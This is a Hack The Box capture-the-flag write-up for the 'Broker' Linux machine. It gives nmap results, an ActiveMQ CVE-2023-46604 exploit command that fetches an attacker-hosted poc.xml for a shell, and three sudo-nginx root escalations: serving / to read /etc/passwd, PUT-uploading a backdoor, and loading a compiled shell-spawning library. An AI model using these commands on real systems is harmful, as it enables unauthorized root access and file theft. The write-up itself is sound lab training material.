---
title: Broker
date: 2026-09-24
description: Easy Linux box hitting ActiveMQ's CVE-2023-46604 OpenWire deserialization for an activemq shell, then abusing NOPASSWD sudo on nginx to load a malicious module.
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Thu Sep 24 10:53:53 2026 as: /usr/lib/nmap/nmap -p22,80,1883,5672,8161,42011,61613,61614,61616 -A -oN scan_results.txt 10.129.230.87
Nmap scan report for broker.htb (10.129.230.87)
Host is up (0.54s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/MasterBroker: 
|_    ActiveMQ/Advisory/Consumer/Topic/#: 
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
42011/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
|_http-title: Site doesnt have a title.
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Jetty(9.4.39.v20210325)
61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5672-TCP:V=7.98%I=7%D=9/24%Time=6AB53991%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0
SF:S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc
SF:0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\
SF:x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(HTTPOptions,
SF:89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x
SF:04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\x
SF:c0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20us
SF:ing\x20unsupported\x20AMQP\x20attempted")%r(RTSPRequest,89,"AMQP\x03\x0
SF:1\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x0
SF:2\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11
SF:amqp:decode-error\xa17Connection\x20from\x20client\x20using\x20unsuppor
SF:ted\x20AMQP\x20attempted")%r(RPCCheck,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\
SF:0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0
SF:\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\
SF:xa17Connection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20att
SF:empted")%r(DNSVersionBindReqTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\
SF:0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x0
SF:2\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Co
SF:nnection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted
SF:")%r(DNSStatusRequestTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x
SF:02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0
SF:\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connectio
SF:n\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(SS
SF:LSessionReq,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x
SF:10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\
SF:x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20
SF:client\x20using\x20unsupported\x20AMQP\x20attempted")%r(TerminalServerC
SF:ookie,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0
SF:\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S
SF:\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client
SF:\x20using\x20unsupported\x20AMQP\x20attempted");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61613-TCP:V=7.98%I=7%D=9/24%Time=6AB5398A%P=aarch64-unknown-linux-g
SF:nu%r(HELP4STOMP,27F,"ERROR\ncontent-type:text/plain\nmessage:Unknown\x2
SF:0STOMP\x20action:\x20HELP\n\norg\.apache\.activemq\.transport\.stomp\.P
SF:rotocolException:\x20Unknown\x20STOMP\x20action:\x20HELP\n\tat\x20org\.
SF:apache\.activemq\.transport\.stomp\.ProtocolConverter\.onStompCommand\(
SF:ProtocolConverter\.java:258\)\n\tat\x20org\.apache\.activemq\.transport
SF:\.stomp\.StompTransportFilter\.onCommand\(StompTransportFilter\.java:85
SF:\)\n\tat\x20org\.apache\.activemq\.transport\.TransportSupport\.doConsu
SF:me\(TransportSupport\.java:83\)\n\tat\x20org\.apache\.activemq\.transpo
SF:rt\.tcp\.TcpTransport\.doRun\(TcpTransport\.java:233\)\n\tat\x20org\.ap
SF:ache\.activemq\.transport\.tcp\.TcpTransport\.run\(TcpTransport\.java:2
SF:15\)\n\tat\x20java\.lang\.Thread\.run\(Thread\.java:750\)\n\0\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 61614/tcp)
HOP RTT       ADDRESS
1   632.07 ms 10.10.16.1
2   309.88 ms broker.htb (10.129.230.87)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 24 10:55:20 2026 -- 1 IP address (1 host up) scanned in 86.60 seconds
```

# User

Port **61616** runs `ActiveMQ v5.15.15`.

> CVE : https://github.com/evkl1d/CVE-2023-46604

Set up a python server hosting the edited **poc.xml**, start a listener, then run the exploit:

```sh
python3 exploit.py -i 10.129.230.87 -p 61616 -u http://10.10.16.82/poc.xml
```

Gained shell as `activemq`

# Root

```sh
sudo -l 

 (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

> https://gtfobins.org/gtfobins/nginx/

There are three ways to abuse it: read files off the system, push a payload onto it, or load a malicious library.

---
### Upload

#### Target
Create a config file and start the nginx server with that config — we can then pull files from the system over HTTP with curl:

```sh
cat >/tmp/nginx.conf <<'EOF'
user root;
http {
  server {
    listen 8080;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF
```

```sh
sudo nginx -c /tmp/nginx.conf
```

#### Attacker
```sh
curl http://target:8080/etc/passwd -o passwd.txt
```

---
### Download

#### Target
Create a config file, start the server with it, and use the **PUT** method to push a binary onto the box for execution:

```sh
cat >/tmp/nginx.conf <<'EOF'
user root;
http {
  server {
    listen 8080;
    root /tmp;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF
```

```sh
sudo nginx -c /tmp/nginx.conf
```

#### Attacker
```sh
curl -X PUT http://target:8080/backdoor.sh --data-binary @./backdoor.sh
```

---
### Library Load

#### Target
Create a malicious library and compile it:

```sh
echo '__attribute__((constructor)) void init() { execl("/bin/sh", "sh", NULL); }' \
    | gcc -w -fPIC -shared -o /tmp/lib.so -x c -
```

Create a config that loads that library:

```sh
cat >/tmp/nginx.conf <<'EOF'
load_module /tmp/lib.so;
events {}
EOF
```

Execute nginx with that conf:

```sh
sudo nginx -t -c /tmp/nginx.conf
```

`-t` tests the config for syntax errors before deploying it

---

Gained `root`
